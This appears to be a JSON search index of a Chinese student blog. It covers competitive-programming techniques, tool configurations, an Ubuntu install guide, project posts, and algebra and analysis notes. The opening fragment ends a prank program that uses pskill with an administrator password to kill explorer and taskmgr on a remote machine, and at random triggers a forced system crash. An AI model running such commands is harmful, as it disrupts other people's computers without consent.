explorer\"); break; case 11: system(\"pskill \\\\\\\\xxx -accepteula -u Administrator -p \\\"happy\\\" taskmgr\"); break; case 12: int p = rand()%100; if(p==0){ system(\"pskill \\\\\\\\xxx -u Administrator -p \\\"happy\\\" -c -d -s notmyfaultc.exe crash 0x01 -accepteula\"); } break; }\t}}","tags":["搞事情"],"categories":["OI"]},{"title":"初步认识分块算法","path":"/2018/10/22/Fenkuai-Algorithm/","content":"我实在太弱了，连分块算法都不知道，现在才学。 分块算法可以解决区间查询功能，可以替代线段树，代码量比线段树少。分块算法的思想是把原始数组分为多个大小相等的连续的块，每次对单个元素或整块操作，下面以求区间和为例。 初始化 分块一般需要以下变量： 123int v[MAXN]; //单个元素的值int atag[MAXN],sum[MAXN] //每一块lazytag，每一块的和int bl[MAXN],blo; //每个元素属于那一块，每块的元素个数 根据某种数学公式可以得出分块每块的大小为sqrt(n)时效率最高，不难写出以下代码： 123456blo = sqrt(n);for(int64 i = 1;i&lt;=n;i++){ v[i] = read(); bl[i] = (int64)(i-1)/blo+1; sum[bl[i]]+=v[i];} 区间更新 分为三个步骤，单点更新l到下一个整块，更新中间的整块，单点更新最后剩下单点。箭头处代码处理l和r在同一块的特殊情况。 12345678910111213141516void add(int64 l,int64 r,int64 x){ int64 first = min(r,bl[l]*blo); //&lt;--- for(int64 i = l;i&lt;=first;i++){ v[i]+=x; sum[bl[i]]+=x; } for(int64 i = bl[l]+1;i&lt;=bl[r]-1;i++){ atag[i]+=x; } if(bl[l]!=bl[r]){ //&lt;--- for(int64 i = (bl[r]-1)*blo+1;i&lt;=r;i++){ v[i]+= x; sum[bl[i]]+=x; } }} 区间查询 类似区间更新，不要忘了lazy 12345678910111213141516int64 query(int64 l,int64 r){ int64 first = min(r,bl[l]*blo); int64 ans = 0; for(int64 i = l;i&lt;=first;i++){ ans+=v[i]+atag[bl[i]]; } if(bl[l]!=bl[r]){ for(int64 i = (bl[r]-1)*blo+1;i&lt;=r;i++){ ans+=v[i]+atag[bl[i]]; } } for(int64 i = bl[l]+1;i&lt;=bl[r]-1;i++){ ans+=atag[i]*blo+sum[i]; } return ans;} 注意分块算法涉及for循环操作较多，经KING_LRL提醒，i使用register int能有效提升速度。分块算法最坏情况时间复杂度为O(3*sqrt(n))。","tags":["oi","算法","分块"],"categories":["OI"]},{"title":"PlaneGame v1.0.0.5 正式版发布","path":"/2018/10/20/PlaneGame-Release/","content":"一月份我说我要做这个打飞机，一直咕到八月八月份的时候我说我能在军训之前做完，军训之后我说我能在开学之后做完，开学之后我说我要在九月份做完，国庆节我说我要在开学前发布（其实国庆代码已经写得差不多了），直到十月底才发布。 取材于晚自习打发时间玩的传纸条小游戏，玩法大致是在方格纸上画一些形状（飞机，船什么的），轮流询问每个方格的内容，去猜测对方船头所在位置。这个在线版比实际玩的版本加入了多对多混战功能，理论上可以全机房一起玩。 这个项目极大地增强了我对WPF的了解，不过noip要来了，在部分功能还未完成的情况下提前发布，也算是了了一码事了。 下载页面 使用方法文档估计只有noip完了才有了。","tags":["dotnet","项目","planegame"],"categories":["项目"]},{"title":"Linux下对拍sh","path":"/2018/10/19/VSCode-Duipai/","content":"不多说,上代码 123456789101112131415161718g++ Problem.cpp -o Problem.outg++ Problem_std.cpp -o Problem_std.outg++ Problem_dm.cpp -o Problem_dm.outprintf \"Compile Compelete \"while true; do ./Problem_dm.out &gt; Problem.in printf \"Data made \" ./Problem_std.out &lt; Problem.in &gt; Problem_std.ans printf \"Std compelete \" ./Problem.out &lt; Problem.in &gt; Problem.ans printf \"Ans Compelete \" if diff Problem.ans Problem_std.ans; then printf \"AC \" else printf \"WA \" exit 0 fidone 为了充分利用VSCode,将下列代码加入代码片段,一秒打出对拍 123456789101112131415161718192021{ \"Duipai\": { \"prefix\": \"duipai\", \"body\": [ \"g++ $1.cpp -o $1.out\", \"g++ $1_std.cpp -o $1_std.out\", \"g++ $1_dm.cpp -o $1_dm.out\", \"while true; do\", \"\\t./$1_dm.out &gt; $1.in\", \"\\t./$1_std.out &lt; $1.in &gt; $1_std.ans\", \"\\t./$1.out &lt; $1.in &gt; $1.ans\", \"\\tif diff $1.ans $1_std.ans; then\", \"\\t\\tprintf \\\"AC\\ \\\"\", \"\\telse\", \"\\t\\tprintf \\\"WA\\ \\\"\", \"\\t\\texit 0\", \"\\tfi\", \"done\" ] }}","tags":["oi","linux","vscode"],"categories":["OI"]},{"title":"GCC/STL里面不那么常用又很有帮助的函数","path":"/2018/10/18/Some-STL-Functions/","content":"今天改以前的错题，发现了几个当初知道干嘛现在搞忘了的函数，能偷懒少写几行代码，再次做一个收集整理。 max_element/min_element/minmax_element 找数组里面最大值或最小值，用法类似sort. 123template &lt;class ForwardIterator, class Compare&gt; ForwardIterator max_element (ForwardIterator first, ForwardIterator last, Compare comp); comp可以省略,注意返回类型是迭代器. accumulate 区间暴力求和. 12template&lt; class InputIt, class T &gt;T accumulate( InputIt first, InputIt last, T init ); init是初始值,一般取0. random_shuffle 随机打乱序列.(模拟退火?) 12template&lt; class RandomIt &gt;void random_shuffle( RandomIt first, RandomIt last ); uninitialized_fill_n 妈妈再也不用担心memset只能赋char了. 12template&lt; class ForwardIt, class Size, class T &gt;void uninitialized_fill_n( ForwardIt first, Size count, const T&amp; value ); G++的__builtin系列 __builtin_popcount(x)：x中1的个数 __builtin_ffs(x)：返回x中最后一个为1的位是从后向前的第几位(lowbit?)","tags":["oi","总结"],"categories":["OI"]},{"title":"玄(pian)学(fen)算法——模拟退火","path":"/2018/10/16/Simulate-Anneal/","content":"NOIP在即，还是复习一下经典玄(pian)学(fen)算法，多骗个二三十分，以免爆零。 我个人理解模拟退火就是随机猜，不过通过温度机制，让当前状态越接近正确答案时随机变化幅度越小，来尽量接近正确答案。大概过程是每次随机出一个新答案，如果这个答案比现在更优秀就直接接受它，否则就根据某个热力学公式按照一定概率接受它，防止被卡在局部最小值，最后降低温度参数。 调参是模拟退火的主要乐趣，可以利用用对拍大法。如果有条件最好卡时。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;algorithm&gt;#include &lt;cmath&gt;#include &lt;ctime&gt;using namespace std;#define SEED time(0)const double TBEGIN = 3000;const double EPS = 1e-14;const double TEND = EPS;const double DELTAT = 0.99;const double INF = 1e18;template&lt;typename T,typename TComp&gt;T SA(T s){\tsrand(SEED);\tdouble t = TBEGIN;\tdouble ans = INF;\tT now = s;\twhile(t&gt;EPS){ T n = now.get_new([](double t)-&gt;double{ return (rand()*2-RAND_MAX)*t; },t); double nans = n.get_ans(); if(TComp()(nans,ans)){ ans = nans; now = n; }else{ if(exp((ans-nans)/t)*RAND_MAX&gt;rand()){ now = n; } } t *= DELTAT;\t}\treturn now;}const double MAX_TIME = 0.8;template&lt;typename T,typename TComp&gt;T SA_Time(T s){\tstate ans = SA&lt;state,less&lt;double&gt; &gt;(s); while((double)clock()/CLOCKS_PER_SEC&lt;MAX_TIME) ans = SA&lt;state,less&lt;double&gt; &gt;(ans); return ans;} 代码说明：T是状态结构体，需要定义T get_new(double(*prand)(double),double t)方法用于更新状态，double get_ans()方法用于计算状态最小值。TComp是less&lt;double&gt;(最小化ans)或greater&lt;double&gt;(最大化ans)","tags":["oi","算法","模拟退火"],"categories":["OI"]},{"title":"GDB常用命令","path":"/2018/10/3/GDB-Usage/","content":"先cd到程序目录，再gdb 您的文件名.exe，记得编译时-g，当出现(gdb)提示时，输入指令。下面为常用指令列表 命令 简写 作用 break b 行号或函数名，设断点 list l 显示附近十行代码 run r 开始运行程序 start st 开始执行并在main函数中断 display disp +变量名，添加查看变量，每次停下时显示 watch 在变量变化时中断 print p 一次性显示查看变量 step s 单步进入 next n 单步继续 continue c 继续 backtrace bt 查看调用栈 frame f 查看栈帧 ^c 暂停执行 (SIGINT) kill k 停止执行 quit q 退出GDB 注意在学校的电脑上手动用GDB时，分清楚打开的是 Pascal的GDB还是C++的GDB ，否则行号会错乱！","tags":["oi","总结"],"categories":["OI"]},{"title":"单硬盘安装Ubuntu18.04与Win10","path":"/2018/10/3/Install-Ubuntu/","content":"最近研究 .net core，wsl用的一点也不爽(图形界面太卡了，还一堆Bug，字体也不好看)，遂决定安装Ubuntu双系统，基本上没有什么困难，下面是我的安装方法(没有多少截图，忘截了)，因为用UEFI，就用不着双硬盘了 去Ununtu官网下载iso镜像，速度不错 准备一个容量大于4G的移动硬盘（U盘也行），划分一个4G大小的FAT32分区或删掉原有文件，直接将ISO镜像里面的所有内容 复制粘贴到空分区里面，不用 特地创建引导。（因为用了UEFI） 用磁盘管理或者别的什么软件在硬盘里划出60G空闲空间，不要 建立分区。 如果托盘区里面有一个 英特尔快速存储技术，就要关掉它，请一定严格按照下列步骤操作，否则win10可能变砖 关闭win10快速启动 进入设置（immersive control panel）&gt; 更新与安全 &gt; 恢复 &gt; 立即重新启动 &gt; 疑难解答 &gt; 更多选项 &gt; 高级启动 进入UEFI设置，找到英特尔快速存储技术并关闭他（我的电脑是在SATA Options里面从Raid On改成AHCI） 退出UEFI设置，开机按F4进入安全模式，登陆进入桌面后重启电脑 重启，进入Boot Menu，关闭secure boot，启动模式设为UEFI Only，如果此时Boot Menu里面没有你的U盘，那就放弃这篇教程吧 选择你的U盘，弹出Grub的菜单，选Try Ubuntu without installing 如果U盘性能足够，很快就进入Ubuntu桌面环境了，双击打开桌面的Install Ubuntu 18.04 LTS 语言选中文，联不联网随意，下一步下一步下一步 这一步很关键，别听其他教程把事情搞复杂，如果第一条提到了windows boot manager或者与其他系统共存什么的就选它没有错 下一步下一步 重启电脑，Ubuntu应该已经是启动项第一位了，开机你会看到一个Grub选单，里面有Windows有Ubuntu，自己选 如果想默认启动Windows，就去UEFI里面把windows boot manager排前面 你可以把Windows的快速启动打开了（别开secure boot和英特尔快速存储技术） Ubuntu中文输入法教程很多，自己看（系统自带的很垃圾，建议用搜狗）","tags":["linux","教程"],"categories":["OI"]},{"title":"实地测试各种读取方法的速度","path":"/2018/9/16/IO-Speed-Test/","content":"对一个包含10000000个 int 的文件进行读取，使用 clock() 计时(以毫秒为单位的CPU时间，括号中为程序实际运行用时) 项目 第一次用时 第二次用时 第三次用时 造数据 1.447s 1.505s 1.452s cin+freopen 8856(10.89s) 8913(8.96s) 8942(8.98s) scanf+freopen 5692(7.41s) 5730(5.77s) 5721(5.77s) 手写快读 2398(4.201s) 2383(2.427s) 2398(2.443s) 手写快读，不判负数 2395(4.199s) 2412(2.457s) 2388(2.437s) 手写快读，不用 isdigit 2402(4.125s) 2430(2.477s) 2424(2.468s) ifstream 43(2.003s) 34(0.08771s) 43(0.08684s) 这不科学！！！ ifstream 怎么这么快！ 好吧是我把文件名写错了，不过 ifstream 还是很快，平均1820左右，比手写快读快。 但是在cw的机器上就翻了过来，ifstream 2.2s, read() 1.8s, 真是奇怪","tags":["废话","oi"],"categories":["OI"]},{"title":"VSCode OI 使用配置","path":"/2018/9/15/VSCode-Config/","content":"学校的电脑居然安装与运行VSCode不卡！（然而打开会卡两分钟）那我为什么还要用Dev-Cpp？下面贴出配置文件。建议安装C/C++扩展，使用Dev-Cpp的MinGW。 launch.json 1234567891011121314151617181920212223242526{ \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"(gdb) Launch\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"${file}.exe\", \"args\": [], \"stopAtEntry\": false, \"cwd\": \"${workspaceFolder}\", \"environment\": [], \"externalConsole\": true, \"MIMode\": \"gdb\", \"setupCommands\": [ { \"description\": \"Enable pretty-printing for gdb\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true } ], \"preLaunchTask\": \"Compile\", \"miDebuggerPath\": \"C:/Program Files/Dev-Cpp/MinGW32/bin/gdb.exe\" } ]} tasks.json 123456789101112131415161718192021{ // See https://go.microsoft.com/fwlink/?LinkId=733558 // for the documentation about the tasks.json format \"version\": \"2.0.0\", \"tasks\": [ { \"label\": \"GCC Compile\", \"type\": \"shell\", \"command\": \"g++\", \"args\": [\"${file}\", \"-o\", \"${fileBasename}.exe\", \"-g\", \"-Wall\"], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"problemMatcher\": \"$gcc\", \"options\": { \"cwd\": \"${fileDirname}\" } } ]} keybindings.json 123456[ { \"key\": \"ctrl+f11\", \"command\": \"workbench.action.tasks.test\" }]","tags":["oi","vscode"],"categories":["OI"]},{"title":"C++快速读写","path":"/2018/9/12/Fast-IO/","content":"这个东西太常用了，单独贴出来吧。（虽然我个人认为这是玄学。） 别忘了 #include 12#include&lt;cstdio&gt;#include&lt;cctype&gt; 12345678910111213inline int read(){ int X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48), ch = getchar(); return w ? -X : X;} 1234567891011121314151617inline double dbread(){ double X = 0, Y = 1.0; int w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) X = X * 10 + (ch ^ 48), ch = getchar(); ch = getchar(); while (isdigit(ch)) X += (Y /= 10) * (ch ^ 48), ch = getchar(); return w ? -X : X;} 12345678inline void write(int x){ if (x &lt; 0) putchar('-'), x = -x; if (x &gt; 9) write(x / 10); putchar(x % 10 + '0');} 其实我更喜欢这样 12ios::sync_with_stdio(false);cin.tie(0);","tags":["oi"],"categories":["OI"]},{"title":"Standard-TLE-Library","path":"/2018/8/31/Standard-TLE-Library/","content":"我看我身边好多人都把自己的模板发到了Github上，于是我也决定献个丑。鉴于市面上的模板同质化严重（雾），所以我的模板库将采用一些不一样的做法，比如说满地class满地new delete满地functor满地STL（满地下划线就算了）。所以这里面很多代码都A不了，多半要T。因此，我将其命名为Standard-TLE-Library。尽管如此，我还是自以为我的代码可读性好一点。","tags":["oi","项目","施工现场"],"categories":["项目"]},{"title":"PlaneGame正在施工中","path":"/2018/8/17/PlaneGame/","content":"施工现场直通车 这个项目我今年一月份就想做了，但是没有什么经验，特别是当时对WPF一无所知，浪费了很多时间在GUI和git上，结果“一个月”过了只画出一个巨丑无比的主界面菜单。对oop的理解也不够深入，定义了一堆接口写不出实现。特别是浪费了大量时间摆弄git，最后发现单人开发就在master分支上一条线就够了，不用那么麻烦。当时还对网络通信一点概念都没有。最后留下了一片稀烂的代码。 所以我选择了删库重来，现在几天的进度已经比整个一月份快得多了。 施工中心得体会 WPF的数据绑定真好用 程序的架构一定要先做好规划，尽量不要中途来改，很麻烦 一个类的方法的抽象层次要统一，不然很难发现那里忘记实现或者重复实现 如果你对PlaneGame有问题，发现了BUG，或者是有什么建议，请到Issues。","tags":["项目","planegame","施工现场"],"categories":["项目"]},{"title":"[已补档]山寨金山打字——KeyboardExercise","path":"/2018/8/6/TypeExercise/","content":"这个是将近一年前的老作品，主要是金山打字对1080P支持很不好，大黑边，极其不爽，还有广告，就自己花了两个下午山寨了一个，体积极小（二进制KB级，剩下4MB都是封面资源图片），功能齐全，可以打开金山打字的资源XML文件，安装方便卸载干净。 用的上古老技术WinForm，结果自己对高分屏也很不友好……目前暂无重制计划。 下载链接 项目链接 Readme和使用说明等会再补","tags":["项目"],"categories":["项目"]},{"title":"DDZGame正式版发布","path":"/2018/8/2/DDZGame-Release/","content":"大概六月中旬在我的GitHub首页上看到了LLF0703等大佬发起的这个项目，甚是有趣，尽管截至今天这个项目下还是没有代码，但是让我有了自己做一个的兴趣，所以我就开工了。大概花了一个多星期就发布了。 发布网址，下载链接，欢迎点击下载体验。 截图：懒得截了，Material Design风格，使用了这个界面库，网络通信组建参考了这个代码，使用方法见readme。 总结了一下，有以下经验： 代码封装一定要清晰，至少界面和逻辑要分开，移植也容易 多上网翻文档，最好参考.NET API Browser，方便发现更简单，更可维护的解决方案 如果你对DDZGame有问题，发现了BUG，或者是有什么建议，请到Issues。 欢迎关注我的下一个项目。","tags":["项目","ddzgame"],"categories":["项目"]},{"title":"SiteInfoAPIBot","path":"/about/bot.html","content":"This site uses a custom Cloudflare Worker named SiteInfoAPIBot to fetch and parse metadata from external websites. This bot is designed to provide rich link previews when users share URLs on the site. Currently, the bot identifies itself with the following User-Agent string: 1Mozilla/5.0 (compatible; SiteInfoAPIBot/1.0; +https://duanyll.com/about/bot) View the source code on GitHub for more details about its implementation and functionality."},{"title":"抽象代数速通 - 群","path":"/wiki/aa/group.html","content":"群 等价关系: 自反性, 对称性, 传递性 由等价关系诱导出等价类, 商集, 的划分 代数运算: 的映射 群: 结合律, 单位元, 逆元 判定: 非空, 良定, 封闭, 结合律, 单位元, 逆元 定理 单位元唯一 逆元唯一 消去律 定理 , 方程 和 有唯一解 方幂, 指数 (倍数) 运算 定理. 非空集合 构成群 结合律 左单位元 左逆元 定理 结合律成立, 构成群 , 在 中都有解 定理 具有左右消去律的有限半群 (结合律成立) 一定是群 子群 子群定义 性质: 单位元, 逆元相同 定理 子群判定 定理 子群判定 定理 子群的交仍是子群 在 中生成的子群是 中含 最小的子群 可以相同 判定子群只需要说明 中心化子 与 可交换的元素 中心 与所有元素都可交换的元素 同构 同构定义: 存在双射保运算 证明同构 构造映射 证明单射 证明满射 证明保运算 定理 同构性质 同构映射可逆, 逆映射也是同构映射 定理 群同构是等价关系 定理 Cayley. 任意群均同构于某一变换群. 循环群 群的阶: 有限群的元素个数 元素的阶: 定理 群阶的性质 定理 元素阶是群阶的因子 循环群: 定理 循环群性质 有限循环群与 同构 无限循环群与 同构 循环群的子群是循环群 推论 推论 无限循环群的全部子群, 有限循环群的全部子群 是素数, 关于模 乘法构成循环群, 生成元即为原根 置换群与对称群 全对称群, 置换群 轮换与轮换表示 置换的乘法, 从右到左结合 定理 不相交轮换的乘积可交换 定理 任意置换可表示成不相交轮换的乘积 定理 任意置换可表示成对换的乘积 (不唯一) 定理 任意置换写成对换的乘积时, 对换个数的奇偶性是一定的 定理 阶全对称群 中, 奇偶置换各占一半 子群的陪集 群的子集积记号 定理 子集积性质 结合律 消去律 利用乘法求逆运算的封闭性证明相互包含 左右陪集 , 左陪集 , 右陪集 定理 陪集性质 或 定理 Lagrange 设 是 阶有限群, 定理 是良定的双射 证明集合相等 证明相互包含 任取左集合元素属于右集合, 任取右集合元素属于左集合 证明 A 或 B 成立, 证明 证明集合元素相等, 构造集合之间双射 (单射 + 满射) 正规子群和商群 正规子群 单群 且 不含非平凡正规子群 素数阶群必为单群 交换群的子群均为正规子群 定理 正规子群判定定理 定理 引理 商群 在集合 上规定乘法运算 , 运算良定且构成群, 称为 模 后的商群 商群的单位元是 商群 的逆元是 是交换群 是交换群 商群的阶是群阶的因子 对 阶交换群, 素数 , 则 中必有 阶元素 判断正规子群常先证子群 , 再 同态基本定理 群同态: 两个群之间的映射满足 则成 是两个群之间的群同态 群同态的基本性质 若 , 则 且 记号: , 记 定理: 则有 核空间 定义群同态 的核为 满足 单射 群同态基本定理 设 是群之间的满同态, 则 规定映射 验证映射良定, 映射结果与代表元无关 证明 满射, 单射 证明 保持乘法运算 推论 第一同构定理 设 是群同态, 则 满同态, 群同态基本定理 用群同态基本定理证明同构 构造同态映射, 先证明良定 证明满射 证明保运算 求 得到 第二同构定理 且 同态映射为 第三同构定理 同态映射为 或者"},{"title":"抽象代数速通 - 环和域","path":"/wiki/aa/ring.html","content":"环的基本概念 环: 是非空集合, 在 上定义了两种二元运算, 加法和乘法满足 对加法运算构成交换群 对乘法运算满足结合律 乘法对加法满足左右分配率 幺环: 若 则称 是 的乘法单位元. 若有 , 则必有 . 默认 具有乘法单位元的环称为幺环 设 是一个幺环. 在 中乘法可逆的元素构成 则 是 的一个乘法子群, 称为 的单位群, 可逆元称为单位 若乘法具有交换律, 则称为交换环 性质: 子环: 环的非空子集 对 中运算也构成环 子环判别定理 是环 的非空子集, 则 是 的子环 定理 的子环均形如 幺环的子环可能是幺环, 单位元可能不同 证明是环 加法封闭 乘法封闭 加法结合律 加法交换律 零元 负元 乘法结合律 乘法左右分配率 (乘法单位元 幺环) (乘法交换律 交换环) 证明子环: 关于减法, 乘法封闭 整环, 域和除环 左右零因子 设 是环, 非零元 满足 , 则 是 的左零因子, 是右零因子, 统称为零因子 (只要和任意非零元相乘为零就是零因子) 定理 无零因子环 成立消去律 () 整环 无零因子的交换幺环 域 两种等价的定义 构成整环, 且非零元素构成乘法群 中定义了加法运算, 乘法运算 是交换群 对乘法是交换群 满足乘法结合律, 分配率 对于 的形式证明构成域, 需说明交换幺环, 对乘法封闭, 乘法交换律, 结合律, 幺元, 需要说明对求逆封闭. 域中的除法 , 规定 则满足 除环 是幺环且 构成群, 则称 是除环. 交换的除环即为域. 四元数除环是典型的非交换除环. 有点暴力 不用把逆元的形式求出来 证明整环可说明 是常见域 (整环) 的子环 ( 封闭) 域 (整环) 中无零因子 包含单位元 定理 有限整环都是域 证明有限整环都是域 理想和商环 理想 环 的非空子集 满足 理想的交与和 设 是环 的理想 是 的理想 是 的理想 环 的有限多个理想的交仍为理想 交换幺环 中元素生成的理想 即 做所有 - 线性组合 主理想 由单个元素生成的理想 主理想整环 Principle Ideal Domain 任意理想都是主理想的整环 是 PID 是 PID 是域 是 PID 商环 是环, 是 的主理想, 则对于加法 , 在加法商群 有加法运算 同时规定乘法 则可证明 关于以上两种运算构成环, 且 是加法交换群 环同态 环同态 映射 满足 可定义单同态, 满同态, 环同构. 环同态核 也是加群之间的群同态核. 是 的一个理想 性质 定理 幺环 , 是环同态 满射 无零因子, 若 则 是 中的单位 是 中单位且 环同构基本定理 设 是满同态, 则有环同构 环的第一同构定理 的环同态, 有环同构 环的第二同构定理 是 的子环, 是 的理想, 则 是 S 的理想且有环同构 环的第三同构定理 和 是 的理想, , 则 是 的理想且有环同构 环的扩张定理 设环 与 无交集. 是单同态, 则存在一个与环 同构的环 以及环同构 满足 是 的子环且 素理想与极大理想 在整数环 中, 考虑素数 生成的理想 在交换环 中, 理想 满足什么条件使得 是整环或域 素理想 设 是交换环的真理想, 满足 或 定理 设 是交换幺环 (), 是 的理想, 则 是 的素理想 是整环 推论 是整环 是素数或零 极大理想 设 是交换环 的一个真理想, 若 中不存在真包含于 的真理想 或 则称 是环 的一个极大理想 定理 构成有限域的基本方法. 设 是交换幺环的一个理想, 则 是 的极大理想 是域. 推论 交换幺环的极大理想是素理想 证明极大理想的常见套路 先说明 是真理想 假设 , 则 由加减法, 乘法的封闭性得到 特征 特征 含乘法幺元的环, 若 的加法阶为 则 若 的加法阶为 则 定理 整环 (域) 的特征是零或素数 定理 交换幺环 , 则 是环的单同态, 可视为 的子环 推论 交换幺环 有一个子环 与 同构 有一个子环 与 同构 定理 是域 是单同态, 可视为 的子域 是素数 是单同态, 可视为 的子域 素域 不含真子域的域 素域 素域 域的素子域 由 在 中生成的域 若 是有限域 为素数 可视为 子域 可视为 上的一个 维 - 线性空间 是 元有限域 是 阶循环群 多项式环 未定元 设 是有单位元的环, 是 的扩环. 满足 有 定义 对任意有单位元的环, 一定存在一个未定元 . 构造集合 规定 上的加法和乘法 则 构成有单位元的环, 单位元为 取 的子环 与 同构 未定元 满足以上三条定义, 且 由环的扩张定理, 单同态 , 知存在 的扩环 中存在未定元 一元多项式 形如 的表达式, 构成多项式环 整环的商域 使用由整数构造分数类似的方法, 将整环扩充成一个域. 记 是整环, 是单位元. 构造集合 定义 上等价关系 容易验证反身性, 对称性, 传递性 (整环上成立消去律) 由等价关系得到商集 , 所在的等价类 划分得到商集 规定代数运算 验证运算良定 (与代表元选取无关) 验证 对加法和乘法构成域 验证加法结合律, 乘法结合律 验证加法交换律, 乘法交换律 验证乘法对加法分配率 的零元 的单位元 有负元 有逆元 由 构造包含 的域, 取映射 是单射 是同态映射 由环的扩张定理知存在 的扩环 与 同构 中每个元素都可表示为 的形式 称 为整环 的商域 惟一分解整环 约定 是整环, 是 的商域, 是 的单位群 上整除的概念和基本性质 且 相伴 且 则称 相伴, 记作 的平凡因子 单位和与 相伴的因子 的真因子 且 不是 的平凡因子 整环上的不可约元 非零, 非单位, 无真因子 素元 非零, 非单位, 且 或 定理 在整环上, 素元都是不可约元 环上范数 设整数 且无平方因子 , 对于以下整环 规定该整环上的一个函数 为环上范数 满足以下性质 在 中 在 中 是单位 设 是整环 中非零单位元, 则以下条件等价 不可约 ( 没有真因子) 或者 或者 或者 或者 惟一分解整环 设 是整环, 非零非单位 存在不可约元 , 则称 有一个不可约分解式 若 的不可约分解式在相伴意义下唯一 若 中任意非零非单位元均有唯一的不可约分解式 则称 是一个惟一分解整环 UFD 定理 是 UFD, 则 不可约 是素元 整环中的真因子链 , 是 的真因子 定理 在 UFD 中, 任意元的真因子链一定有限终止 证明素元, 可借助环上范数是素数. 证明不可约元, 考虑其环上范数的可分解性. 环上范数是素数 不可约元, 环上范数不是素数也可能是不可约元. 证明不是素元, 找一个反例"},{"title":"数分速通 - 数列极限","path":"/wiki/calculus/array-limit.html","content":"Stolz 定理 定理 设 为严格单增的正无穷大量, 若 可为实数, , 则 时可能不成立 对应导数的洛必达法则 简要证明 先证 已知极限定义 展开绝对值, 累加不等式到 同除 , 中间得到 两边的 , 丢掉; 中间的 受已知极限约束可任意小 再证 , 令 实数基本定理 实数的重要性质: 运算的封闭性 有序性 稠密性 完备性: 任意实数都是有理数列的极限 单调有界定理 定理 单调有界数列必收敛 简要证明 将实数视作十进制无限小数, 从高位到低位, 必存在数列中某一项后该十进制数位不再变化, 则小数点后 位不变时, 能控制 简要证明 单调性作差可知 可得下界, 则 极限存在 闭区间套定理 定义 闭区间列 满足 不要求真包含 区间能不断缩小 则称 为一个闭区间套 定理 若 是一个闭区间套, 则存在唯一的 使得 简要证明 由 知 则 单增有上界, 单减有下界, 两数列极限存在. 知两数列极限相等, 存在性得证. 唯一性, 再设 , 则 闭区间套定理的常见应用: 不断二分或三分缩短区间, 保持性质成立, 由定理得极限存在. Bolzano-Weierstrass 定理 定理 的充要条件是 的每个子列 都有 定理 有界数列必有收敛子列. 简要证明 设 , 则可二分构造闭区间套, 选取二分区间中至少一个含有 的无穷多项, 那么从每次迭代的区间中选出 , 即可保证 收敛到 推论 有界发散数列必存在两个子列收敛到不同的数. 简要证明 由 B-W 定理取一子列 收敛到 , 则取 , 可构造子列 不收敛到 . 有界 有收敛子列不收敛到 (若所有收敛子列都收敛到 , 则 收敛到 ) Cauchy 收敛原理 避免极限与实数的循环定义 定义 数列 满足 , 则称为基本数列 定理 基本数列 收敛数列 简要证明 易知收敛 基本数列. 先证有界性. 则存在收敛子列 Cauchy 收敛常用三角不等式构造 确界存在定理 定义 上确界: 是非空数集 的最小上界. 是 的上界, 是 的最小上界, 不是 的上界, 定理 非空有上界的实数集必有上确界. 简要证明 先说明 , 是 的上界, 但是 不是上界 取 , 是上界, 同时 进而由 Cauchy 收敛知 , 然后说明 符合 的定义: 要证 不是 的上界, (利用极限找到 ) 而 不是上界, 则 Heine-Borel 有限覆盖定理 定义 开覆盖: 设 非空, 若开区间族 满足 称 是 的一个开覆盖 易知 , 开覆盖存在. 定理 闭区间 的任意一个开覆盖 存在有限子覆盖, 即在 中存在有限个开区间 满足 简要证明 反证, 设某个闭区间的开覆盖不存在有限子覆盖, 则可以二分构造不存在有限子覆盖的闭区间套 可用闭区间套定理, 收敛到一个点上一定可以用一个开区间盖住 可用确界存在定理. 闭区间套 满足 单增有上界 不存在有限子覆盖. 取 , 则 则 一定属于开覆盖中一个开区间, 能被这个开区间覆盖, 矛盾. 用 H-B 有限覆盖定理把无限个开区间的性质转化为有限个区间的性质. 用 H-B 有限覆盖定理证明单调有界定理. 设 单增有上界, 证明 收敛. 反证, 假设 发散, 构造 的开覆盖 只含有 的有限项. 开覆盖存在有限子覆盖, 则可以构造有限子覆盖只含有 的有限项, 则 只含有 的有限项, 矛盾. 上下极限 定义 极限点：有界数列 存在子列 收敛到 , 称 是 的极限点 定理 记有界数列的所有极限点构成集合 , , 有 , 即 简要证明 要证 , 需要找到子列收敛到 . 利用上确界定义, , 取 构造 中数列 , 还需要在 附近找到 . 由极限点的定义. 可构造子列 . 记 定理 有界数列收敛的充要条件 极限点和上下极限的定义也可以扩充到 的情况 上下极限的运算 对任意有界数列 对任意非负数列 上下极限的和 其中一数列极限存在则取等 (不定式除外). 非负数列的上下极限的积 其中一数列极限存在则取等 (不定式除外). 拆开上下极限, 范围变大; 合并上下极限, 范围变小. 证明可用 利用上下极限证明 (伪证) 极限存在: 肯定上下极限分别存在, 然后用上面的运算得到结果的上下极限大小关系, 发现刚好限制到相等. 说明利用上下极限的例题通过最大, 最小极限点的定义求上下极限利用 展开上下极限, 比较大小关系证明递推数列上下极限存在证明有界递推式两端分别取上下极限, 并应用上下极限的运算得到关于 的方程组, 解方程组得到 用调几算平处理连加连乘 ( 在指数上)通过放缩证明时, 若不能先说明 的存在性, 可以在处理上界时写 , 处理下界写 类似 的式子, 通过 处理下标到有限范围 内 压缩映射原理 定义 设 , 映射 满足 为常数, 称 是 上的一个压缩映射, 是压缩比. 若 在 连续, 在 可导, , 则 是 上的压缩映射. 定义 设 , 映射 , 若 满足 则 是 在 上的一个不动点 定理 设 是 上的压缩映射, 则 , 数列 收敛 记 , 则 是 在 上的唯一不动点 满足估计 后者为先验估计, 只需要求前两项就可以估计某一项的收敛程度 简要证明 Cauchy 数列 收敛 证 , 由数列极限保序性, . 取极限可知 . 再证唯一性: 估计: 在迭代公式中找到压缩映射, 证明极限存在, 不动点存在 对于闭集上的多元向量值压缩映射, 仍然可说明不动点存在且唯一. 说明压缩映射例题对于递推数列, 说明迭代函数符合压缩映射的条件, 说明数列收敛可以枚举数列的前几项来确定压缩映射成立的区间也可证明数列极限的压缩性 通过 Cauchy 收敛说明极限存在, 再作差说明唯一性"},{"title":"数分速通 - 导数与微分","path":"/wiki/calculus/differential.html","content":"一元导函数性质 定理 